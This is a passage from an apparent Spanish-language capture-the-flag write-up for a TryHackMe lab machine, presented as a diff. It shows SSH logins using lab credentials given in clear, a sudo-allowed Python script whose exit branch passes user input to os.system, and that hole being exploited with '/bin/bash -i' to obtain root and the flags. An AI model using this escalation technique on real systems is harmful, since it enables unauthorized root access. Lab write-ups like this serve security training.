@@ -489,3 +489,225 @@ ftp password? love4ever
 What is the ssh username? james
 What is the ssh password? bluelove
 What is the condor password? pasificbell1981
+
+
+Me logueo con las nuevas credenciales y veo que hay en su directorio.
+
+ssh condor@10.129.179.58 -p 1337
+Enter passphrase for key '/home/mksk/.ssh/id_rsa': 
+Enter passphrase for key '/home/mksk/.ssh/id_rsa': 
+Enter passphrase for key '/home/mksk/.ssh/id_rsa': 
+condor@10.129.179.58's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue May 26 12:24:18 UTC 2026
+
+  System load:  0.0                Processes:           99
+  Usage of /:   34.2% of 12.01GB   Users logged in:     0
+  Memory usage: 35%                IP address for ens5: 10.129.179.58
+  Swap usage:   0%
+
+  => There is 1 zombie process.
+
+
+51 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Jul 14 17:58:10 2020 from 192.168.1.6
+condor@mnemonic:~$ ls
+'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
+''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
+
+Tan solo veo las cadenas de b64 que he encontrado antes.
+
+Hago sudo -l, y me da la siguiente salida:
+
+sudo -l
+[sudo] password for condor: 
+Matching Defaults entries for condor on mnemonic:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User condor may run the following commands on mnemonic:
+    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
+
+Veo el script de python que puedo usar como sudo.
+
+
+condor@mnemonic:~$ cat /bin/examplecode.py 
+#!/usr/bin/python3
+import os
+import time
+import sys
+def text(): #text print 
+
+
+	print("""
+
+	------------information systems script beta--------
+	---------------------------------------------------
+	---------------------------------------------------
+	---------------------------------------------------
+	---------------------------------------------------
+	---------------------------------------------------
+	---------------------------------------------------
+	----------------@author villwocki------------------""")
+	time.sleep(2)
+	print("\nRunning...")
+	time.sleep(2)
+	os.system(command="clear")
+	main()
+
+
+def main():
+	info()
+	while True:
+		select = int(input("\nSelect:"))
+
+		if select == 1:
+			time.sleep(1)
+			print("\nRunning")
+			time.sleep(1)
+			x = os.system(command="ip a")
+			print("Main Menü press '0' ")
+			print(x)
+
+		if select == 2:
+			time.sleep(1)
+			print("\nRunning")
+			time.sleep(1)
+			x = os.system(command="ifconfig")
+			print(x)
+
+		if select == 3:
+			time.sleep(1)
+			print("\nRunning")
+			time.sleep(1)
+			x = os.system(command="ip route show")
+			print(x)
+
+		if select == 4:
+			time.sleep(1)
+			print("\nRunning")
+			time.sleep(1)
+			x = os.system(command="cat /etc/os-release")
+			print(x)
+
+		if select == 0: 
+			time.sleep(1)
+			ex = str(input("are you sure you want to quit ? yes : "))
+		
+			if ex == ".":
+				print(os.system(input("\nRunning....")))
+			if ex == "yes " or "y":
+				sys.exit()
+                      
+
+		if select == 5:                     #root
+			time.sleep(1)
+			print("\nRunning")
+			time.sleep(2)
+			print(".......")
+			time.sleep(2)
+			print("System rebooting....")
+			time.sleep(2)
+			x = os.system(command="shutdown now")
+			print(x)
+
+		if select == 6:
+			time.sleep(1)
+			print("\nRunning")
+			time.sleep(1)
+			x = os.system(command="date")
+			print(x)
+
+
+
+
+		if select == 7:
+			time.sleep(1)
+			print("\nRunning")
+			time.sleep(1)
+			x = os.system(command="rm -r /tmp/*")
+			print(x)
+
+                      
+              
+
+
+       
+
+
+            
+
+def info():                         #info print function
+	print("""
+
+	#Network Connections   [1]
+
+	#Show İfconfig         [2]
+
+	#Show ip route         [3]
+
+	#Show Os-release       [4]
+
+        #Root Shell Spawn      [5]           
+
+        #Print date            [6]
+
+	#Exit                  [0]
+
+	""")
+
+def run(): # run function 
+	text()
+
+run()
+
+Me fijo en que antes de salir del script, ejecuta la entrada del usuario como comando del sistema.
+
+			if ex == ".":
+				print(os.system(input("\nRunning....")))
+
+Voy a explotarlo.
+
+Running...
+
+
+
+
+	#Network Connections   [1]
+
+	#Show İfconfig         [2]
+
+	#Show ip route         [3]
+
+	#Show Os-release       [4]
+
+        #Root Shell Spawn      [5]           
+
+        #Print date            [6]
+
+	#Exit                  [0]
+
+	
+
+Select:0
+are you sure you want to quit ? yes : .
+
+Running..../bin/bash -i
+
+En efecto, soy root.
+
+Consigo la segunda flag.
+root@mnemonic:/root# cat root.txt
+THM{cong*****************hme}
+
+Hay un paso final, hashear la contraseña a MD5.
+THM{2a48****************586}
